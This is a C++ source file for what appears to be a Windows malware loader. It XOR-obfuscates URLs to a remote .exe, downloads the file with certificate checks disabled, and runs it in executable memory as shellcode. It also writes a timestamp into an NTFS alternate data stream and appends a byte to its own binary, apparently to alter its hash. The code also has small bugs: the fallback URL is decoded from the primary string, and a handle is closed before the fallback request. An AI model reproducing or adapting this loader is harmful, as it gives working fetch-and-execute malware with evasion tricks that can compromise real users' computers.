#include <windows.h>
#include <iostream>
#include <iomanip>
#include <string>
#include <sstream>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")

// Function to download file content into memory
BYTE* DownloadFileToMemory(LPCWSTR urlPrimary, LPCWSTR urlSecondary, DWORD* outSize) {
    HINTERNET hInternet = InternetOpen(L"WinHTTP", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return NULL;
    }

    HINTERNET hUrl = InternetOpenUrl(hInternet, urlPrimary, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        HINTERNET hUrl = InternetOpenUrl(hInternet, urlSecondary, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
        if (!hUrl) {
            InternetCloseHandle(hInternet);
            return NULL;
        }
    }



    DWORD bytesRead = 0;
    DWORD totalBytesRead = 0;
    DWORD bufferSize = 1024;
    BYTE* buffer = (BYTE*)malloc(bufferSize);
    BYTE* memoryBuffer = NULL;

    if (!buffer) {
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return NULL;
    }

    // Read the file into memory
    do {
        if (!InternetReadFile(hUrl, buffer, bufferSize, &bytesRead)) {
            free(buffer);
            InternetCloseHandle(hUrl);
            InternetCloseHandle(hInternet);
            return NULL;
        }

        if (bytesRead > 0) {
            BYTE* tempBuffer = (BYTE*)realloc(memoryBuffer, totalBytesRead + bytesRead);
            if (!tempBuffer) {
                free(buffer);
                free(memoryBuffer);
                InternetCloseHandle(hUrl);
                InternetCloseHandle(hInternet);
                return NULL;
            }

            memoryBuffer = tempBuffer;
            memcpy(memoryBuffer + totalBytesRead, buffer, bytesRead);
            totalBytesRead += bytesRead;
        }
    } while (bytesRead > 0);

    free(buffer);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);

    *outSize = totalBytesRead;
    return memoryBuffer;
}

// Function to execute the binary in memory
BOOL ExecuteBinaryFromMemory(BYTE* binaryData, DWORD binarySize) {
    PVOID shellcode_exec = VirtualAlloc(NULL, binarySize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shellcode_exec) {
        return FALSE;
    }

    RtlCopyMemory(shellcode_exec, binaryData, binarySize);

    DWORD threadID;
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
    if (!hThread) {
        VirtualFree(shellcode_exec, 0, MEM_RELEASE);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    VirtualFree(shellcode_exec, 0, MEM_RELEASE);

    return TRUE;
}

std::wstring xS(const std::wstring& input, wchar_t key) {

    std::wstring output = input;
    for (size_t i = 0; i < output.length(); ++i) {
        output[i] ^= key; 
    }
    return output;

}

std::wstring PrintSystemTime(const SYSTEMTIME& time) {
    std::wstringstream wss;

    wss << std::setfill(L'0') << std::setw(2) << time.wHour << L":"
        << std::setw(2) << time.wMinute << L":"
        << std::setw(2) << time.wSecond << L"."
        << std::setw(3) << time.wMilliseconds << L" "
        << std::setw(4) << time.wYear << L"-"
        << std::setw(2) << time.wMonth << L"-"
        << std::setw(2) << time.wDay;

    // Return the built string
    return wss.str();
}

int main() {
    std::wstring original_url_primary = L"iuuqr;..cs`{hmrqnsur/nsf.ud`lr.G`mbnor/dyd";
    std::wstring original_url_secondary = L"iuuqr;..rqnsubs`ud/nsf.ud`lr.G`mbnor/dyd";

    wchar_t k = 1;
    std::wstring urlPrimary = xS(original_url_primary, k);
    std::wstring urlSecondary = xS(original_url_primary, k);
    DWORD fileSize = 0;

    
    // Download the file into memory
    BYTE* fileData = DownloadFileToMemory(urlPrimary.c_str(), urlSecondary.c_str(), &fileSize);
    if (!fileData) {
        printf("Failed to download file.\n");
        return 1;
    }

    // Execute the file from memory
    if (!ExecuteBinaryFromMemory(fileData, fileSize)) {
        printf("Failed to execute binary.\n");
        free(fileData);
        std::cout << GetLastError() << std::endl;
        return 1;
    }
    

    wchar_t procName[MAX_PATH];
    DWORD res = 0;
    res = GetModuleFileNameW(NULL, procName, MAX_PATH);

    if (res == 0) {
        return 1;

    }

    std::wstring executablePath(procName);

    std::wstring streamName = L":mystream";

    std::wstring fullPath = executablePath + streamName;

    SYSTEMTIME localTime;
    GetLocalTime(&localTime);

    std::wstring data = PrintSystemTime(localTime);

    HANDLE hFile = CreateFileW(
        fullPath.c_str(),          // File name (including ADS)
        GENERIC_WRITE,             // Open for writing
        FILE_SHARE_READ | FILE_SHARE_WRITE, // Allow sharing for read and write access
        NULL,                      // Default security
        CREATE_ALWAYS,             // Always create a new stream or overwrite if it exists
        FILE_ATTRIBUTE_NORMAL,     // Normal file attributes
        NULL                       // No template file
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        std::wcerr << L"Failed to open or create the alternate data stream. Error: " << GetLastError() << std::endl;
        return 1;
    }

    DWORD bytesWritten;
    if (!WriteFile(hFile, data.c_str(), data.size() * sizeof(wchar_t), &bytesWritten, NULL)) {
        CloseHandle(hFile);
        return 1;
    }

    CloseHandle(hFile);

    hFile = CreateFileW(
        fullPath.c_str(),          // File name (including ADS)
        GENERIC_READ,              // Open for reading
        FILE_SHARE_READ | FILE_SHARE_WRITE, // Allow sharing for read and write access
        NULL,                      // Default security
        OPEN_EXISTING,             // Open existing stream
        FILE_ATTRIBUTE_NORMAL,     // Normal file attributes
        NULL                       // No template file
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        return 1;
    }

    wchar_t buffer[256];  // Must match the wide-character type
    DWORD bytesRead;

    if (!ReadFile(hFile, buffer, sizeof(buffer) - sizeof(wchar_t), &bytesRead, NULL)) {
        CloseHandle(hFile);
        return 1;
    }

    buffer[bytesRead / sizeof(wchar_t)] = L'\0';

    CloseHandle(hFile);

    HANDLE hBinFile = CreateFileW(
        executablePath.c_str(),          // File path
        FILE_APPEND_DATA,                // Append data to the file
        FILE_SHARE_READ | FILE_SHARE_WRITE, // Allow read/write sharing
        NULL,                            // Default security
        OPEN_EXISTING,                   // Open the existing file
        FILE_ATTRIBUTE_NORMAL,           // Normal file attributes
        NULL                             // No template file
    );

    if (hBinFile == INVALID_HANDLE_VALUE) {
        return 1;
    }

    SetFilePointer(hBinFile, 0, NULL, FILE_END);

    const int nullByteCount = 1; // Number of null bytes to append
    char nullBytes[nullByteCount] = { 0 }; // Array of null bytes

    DWORD bytesWrittenIn;
    if (!WriteFile(hBinFile, nullBytes, nullByteCount, &bytesWrittenIn, NULL)) {
        CloseHandle(hBinFile);
    }

    CloseHandle(hBinFile);

    free(fileData);
    return 1337;

}
